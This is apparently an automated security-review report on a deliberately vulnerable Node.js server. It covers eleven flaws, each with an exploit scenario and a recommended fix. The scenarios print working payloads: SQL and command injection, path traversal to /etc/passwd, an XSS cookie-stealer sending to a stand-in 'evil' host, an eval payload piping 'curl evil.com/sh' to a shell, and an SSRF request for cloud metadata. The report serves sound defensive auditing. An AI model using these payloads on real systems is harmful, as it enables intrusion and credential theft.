# /security-review 検出結果

> 実行日: 2026-05-02
> 対象: vulnerable-app/server.js

## Vuln 1: SQL Injection

- **ファイル:** `vulnerable-app/server.js:38`
- **Severity:** High
- **Description:** The `/api/login` endpoint builds a SQL query via template-literal interpolation of `req.body.username` and `req.body.password` with no parameterization or escaping, then executes it via `db.prepare(query).get()`. Better-sqlite3's `prepare` does not sanitize interpolated values — only bound `?` placeholders are safe.
- **Exploit Scenario:** An attacker sends `POST /api/login` with `{"username":"admin' --","password":"x"}`. The query becomes `SELECT * FROM users WHERE username = 'admin' --' AND password = 'x'`, bypassing authentication and returning the admin record (including the plaintext password and role). `' OR 1=1 --` returns the first user equally trivially.
- **Recommendation:** Use parameterized queries: `db.prepare("SELECT * FROM users WHERE username = ? AND password = ?").get(username, password)`. Also store passwords using a salted strong KDF (bcrypt/argon2), not plaintext.

## Vuln 2: Command Injection

- **ファイル:** `vulnerable-app/server.js:56`
- **Severity:** High
- **Description:** The `/api/ping` endpoint passes the unvalidated `host` query parameter directly into a shell command via `child_process.exec()`, which spawns `/bin/sh -c` (or `cmd.exe /c` on Windows) and interprets shell metacharacters.
- **Exploit Scenario:** An attacker requests `GET /api/ping?host=8.8.8.8;cat%20/etc/passwd` (or `?host=x%26whoami` on Windows). Shell metacharacters are interpreted, resulting in arbitrary command execution as the Node process user — full server compromise.
- **Recommendation:** Replace `exec` with `execFile`/`spawn` using an argument array (`execFile('ping', ['-c','3', host])`) and strictly validate `host` against a hostname/IP allowlist regex.

## Vuln 3: Reflected XSS

- **ファイル:** `vulnerable-app/server.js:74`
- **Severity:** High
- **Description:** The `/search` endpoint reflects the `q` query parameter directly into an HTML response with no encoding/escaping. `res.send` defaults to `Content-Type: text/html` for string payloads, so the injected markup is rendered.
- **Exploit Scenario:** An attacker crafts `https://victim/search?q=<script>fetch('https://evil/steal?c='+document.cookie)</script>` and lures a victim to click it. The script executes in the victim's browser in the site's origin, enabling session theft and account takeover.
- **Recommendation:** HTML-escape user input before embedding (use a templating engine with auto-escape, or escape `& < > " '` manually). Add `Content-Security-Policy` and `X-Content-Type-Options: nosniff` headers.

## Vuln 4: Path Traversal

- **ファイル:** `vulnerable-app/server.js:100-104`
- **Severity:** High
- **Description:** The `/api/files` endpoint constructs a file path using `path.join(__dirname, "uploads", filename)` with the unsanitized `filename` query parameter. `path.join` resolves `..` segments, allowing escape from the `uploads` directory and read of arbitrary files via `fs.readFileSync`.
- **Exploit Scenario:** An attacker requests `GET /api/files?filename=../../../../etc/passwd` (or `..\..\..\..\Windows\win.ini`). The server reads and returns arbitrary files readable by the Node process — source code (including the hardcoded secrets in `server.js`), SSH keys, configuration, and database files.
- **Recommendation:** Resolve the final path and verify containment: `const resolved = path.resolve(uploadsDir, filename); if (!resolved.startsWith(uploadsDir + path.sep)) { return res.status(400).end(); }`. Prefer an allowlist of filenames or opaque IDs mapped to real paths server-side.

## Vuln 5: Broken Access Control / Authentication Bypass

- **ファイル:** `vulnerable-app/server.js:128-136`
- **Severity:** High
- **Description:** The `/api/admin/users` endpoint authorizes solely based on a client-supplied query parameter `role=admin`. There is no authentication and no server-side authorization check.
- **Exploit Scenario:** Any unauthenticated attacker requests `GET /api/admin/users?role=admin` and receives the full users table including usernames, plaintext/MD5 passwords, emails, and roles — yielding immediate admin credential disclosure.
- **Recommendation:** Authenticate the request (verified session/JWT) and derive role from server-side user state. Never trust client-supplied authorization claims via query params or headers.

## Vuln 6: IDOR / Sensitive Data Exposure

- **ファイル:** `vulnerable-app/server.js:141-148`
- **Severity:** High
- **Description:** `/api/users/:id` requires no authentication or authorization and returns the full user record — including the password and role columns. IDs are sequential `INTEGER PRIMARY KEY AUTOINCREMENT`, so they are trivially enumerable.
- **Exploit Scenario:** An attacker iterates `GET /api/users/1`, `/api/users/2`, … and harvests every user's credentials. Combined with the seeded plaintext rows (`admin`/`admin123`), this yields immediate admin takeover.
- **Recommendation:** Require authentication, enforce that callers can only access their own record (or have admin role verified server-side), and never return password fields. Select explicit columns rather than `SELECT *`.

## Vuln 7: Remote Code Execution via eval()

- **ファイル:** `vulnerable-app/server.js:180-188`
- **Severity:** High
- **Description:** `/api/compute` passes the request body field `expression` directly to `eval()`, executing arbitrary attacker-supplied JavaScript inside the Node.js process.
- **Exploit Scenario:** `POST /api/compute` with `{"expression":"require('child_process').execSync('curl evil.com/sh|sh').toString()"}` yields full remote code execution as the Node process user — complete server compromise, exfiltration, lateral movement.
- **Recommendation:** Remove `eval` entirely. If math evaluation is required, use a sandboxed expression parser (e.g., `mathjs.evaluate` with a restricted scope) or strictly validate input against a tiny grammar.

## Vuln 8: Sensitive Information Disclosure via Debug Endpoint

- **ファイル:** `vulnerable-app/server.js:193-203`
- **Severity:** High
- **Description:** `/api/debug` is unauthenticated and returns hardcoded `DB_PASSWORD`, `API_KEY`, and `JWT_SECRET` in the JSON response body to any caller, along with runtime details.
- **Exploit Scenario:** An attacker hits `GET /api/debug` and obtains the database password, API key, and JWT signing secret. With the JWT secret an attacker can forge arbitrary authenticated tokens (admin impersonation if any JWT auth is later added); the DB credential and API key enable downstream pivoting.
- **Recommendation:** Remove the endpoint entirely. Load secrets from environment variables / a secret manager (never hardcoded), and never expose them via any HTTP response. If a debug endpoint is required, gate it on strong authentication and a non-production environment check.

## Vuln 9: Hardcoded Secrets in Source

- **ファイル:** `vulnerable-app/server.js:29-31`
- **Severity:** Medium
- **Description:** `JWT_SECRET = "super-secret-key-12345"`, `API_KEY`, and `DB_PASSWORD` are hardcoded constants in source code committed to VCS. The JWT secret is also a low-entropy guessable string.
- **Exploit Scenario:** Anyone with source access (repo collaborators, leaks, the path-traversal at `/api/files`, or the disclosure at `/api/debug`) trivially obtains the secrets. The values persist forever in git history even after rotation, and the predictable JWT secret would enable token forgery if the constant is ever wired into a `jwt.sign`/`jwt.verify` flow.
- **Recommendation:** Load secrets from environment variables or a secret manager at startup. Use a cryptographically random, high-entropy JWT secret. Rotate any committed credentials immediately and rewrite git history if feasible.

## Vuln 10: Weak Password Hashing (Unsalted MD5)

- **ファイル:** `vulnerable-app/server.js:164`
- **Severity:** Medium
- **Description:** `/api/register` hashes user passwords with unsalted MD5. MD5 is broken for collision resistance and, more importantly here, is extremely fast and unsalted — making rainbow-table and brute-force recovery trivial.
- **Exploit Scenario:** When the `users` table leaks (via the IDOR at `/api/users/:id`, the SQLi at `/api/login`, or the authz bypass at `/api/admin/users` — all confirmed in this codebase), unsalted MD5 hashes are cracked en masse in seconds with off-the-shelf tools, exposing user credentials likely reused on other services.
- **Recommendation:** Use a memory-hard password KDF with per-user salt: argon2id (preferred) or bcrypt with an appropriate work factor. Migrate existing hashes opportunistically on next successful login.

## Vuln 11: Server-Side Request Forgery (SSRF)

- **ファイル:** `vulnerable-app/server.js:114-122`
- **Severity:** Medium
- **Description:** `/api/fetch` performs an outbound HTTP request to a fully attacker-controlled `url` query parameter — host and path included via `http.get(url)` — and returns the response body to the caller. No allowlist, no IP/metadata filtering, no redirect handling.
- **Exploit Scenario:** An attacker requests `GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` to exfiltrate cloud IAM credentials, or `http://127.0.0.1:<internal-port>/admin` to reach internal services not exposed publicly.
- **Recommendation:** Validate `url` against a strict host allowlist; resolve DNS and reject private/loopback/link-local ranges (RFC1918, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7) before connecting, including post-resolution to defeat DNS rebinding; disable redirects or revalidate after each hop.
